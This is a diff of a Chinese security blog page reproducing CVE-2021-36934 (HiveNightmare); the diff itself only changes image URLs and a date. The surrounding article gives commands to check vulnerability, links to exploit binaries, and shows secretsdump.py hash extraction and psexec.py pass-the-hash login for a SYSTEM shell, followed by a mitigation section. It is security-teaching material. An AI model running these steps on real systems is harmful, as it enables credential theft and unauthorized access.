@@ -271,7 +271,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723155856.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210723155856.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -432,7 +432,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-04
+                    2021-11-22
                 </div>
                 
 
@@ -478,13 +478,13 @@
 <pre class="line-numbers language-none"><code class="language-none">icacls C:\windows\system32\config\sam<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>如果输出 BUILTIN\Users:(I)(RX) 表示该系统易受攻击。</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723110132.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210723110132.png"></p>
 <p>如果输出 Access is denied 或拒绝访问表示该系统不易受攻击。</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723111446.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210723111446.png"></p>
 <h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><p>EXP 地址为：<a target="_blank" rel="noopener" href="https://github.com/GossiTheDog/HiveNightmare">https://github.com/GossiTheDog/HiveNightmare</a></p>
 <p>作者编译好的 exe 文件：<a target="_blank" rel="noopener" href="https://github.com/GossiTheDog/HiveNightmare/releases/download/0.5/HiveNightmare.exe">https://github.com/GossiTheDog/HiveNightmare/releases/download/0.5/HiveNightmare.exe</a></p>
 <p>直接将作者编译好的 HiveNightmare.exe 拷贝到目标系统上执行，这里以 Windows 10 1809 为例。</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723132944.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210723132944.png"></p>
 <p>可以看到在低权限账号下，成功利用 CVE-2021–36934 读取到了 SAM、SECURITY、SYSTEM 三个文件。</p>
 <p>除了 HiveNightmare 项目外，ShadowSteal 项目也能实现同样的效果，不过该项目需要编译使用，编译步骤如下：</p>
 <p>在 Linux 下运行以下命令，以 Kali 为例。</p>
@@ -496,17 +496,17 @@ git clone https:&#x2F;&#x2F;github.com&#x2F;HuskyHacks&#x2F;ShadowSteal.git &amp
 make &amp;&amp; cd bin&#x2F; &amp;&amp; ls -l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>将编译好的 ShadowSteal.exe 放到目标系统上直接执行即可。</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723141315.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210723141315.png"></p>
 <p>在获得  SAM、SECURITY、SYSTEM 文件后，我们就可以使用 secretsdump.py 获取目标用户的 hash 了。</p>
 <pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket.git
 cd impacket&#x2F;examples
 python3 secretsdump.py -sam SAM-2021-06-17 -system SYSTEM-2021-06-17 -security SECURITY-2021-06-17 LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723144111.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210723144111.png"></p>
 <p>再使用 psexec.py 直接利用 administrator 的 hash 登录管理员账户，获得 SYSTEM 权限会话。</p>
 <pre class="line-numbers language-none"><code class="language-none">python3 psexec.py -hashes xxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxx administrator@172.16.214.10 cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723155856.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210723155856.png"></p>
 <h1 id="0x03-修复方案"><a href="#0x03-修复方案" class="headerlink" title="0x03 修复方案"></a>0x03 修复方案</h1><p>微软目前仍在研究该漏洞（编号为CVE-2021-36934），还未发布补丁更新。不过微软提供了一个临时性的解决方案。</p>
 <p>1、限制对 %windir%\system32\config 内容的访问</p>
 <p>​    以管理员身份打开命令提示符或 Windows PowerShell，运行以下命令：icacls %windir%\system32\config*.* /inheritance:e</p>
@@ -520,7 +520,7 @@ python3 secretsdump.py -sam SAM-2021-06-17 -system SYSTEM-2021-06-17 -security S
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247494395&idx=1&sn=c40e68e018c2112d7e3ce74b9a55c724">https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247494395&amp;idx=1&amp;sn=c40e68e018c2112d7e3ce74b9a55c724</a></p>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/TeamsSix_Subscription_Logo2.png"></p>
 
                 
             </div>
@@ -672,7 +672,7 @@ python3 secretsdump.py -sam SAM-2021-06-17 -system SYSTEM-2021-06-17 -security S
                 <a href="/210728-130839.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727162552.png" class="responsive-img" alt="【内网学习笔记】浅谈几个 Windows 错误配置利用的方法">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210727162552.png" class="responsive-img" alt="【内网学习笔记】浅谈几个 Windows 错误配置利用的方法">
                         
                         <span class="card-title">【内网学习笔记】浅谈几个 Windows 错误配置利用的方法</span>
                     </div>
@@ -728,7 +728,7 @@ python3 secretsdump.py -sam SAM-2021-06-17 -system SYSTEM-2021-06-17 -security S
                 <a href="/210722-173157.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210722172401.png" class="responsive-img" alt="【内网学习笔记】15、系统服务权限配置不当利用">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210722172401.png" class="responsive-img" alt="【内网学习笔记】15、系统服务权限配置不当利用">
                         
                         <span class="card-title">【内网学习笔记】15、系统服务权限配置不当利用</span>
                     </div>
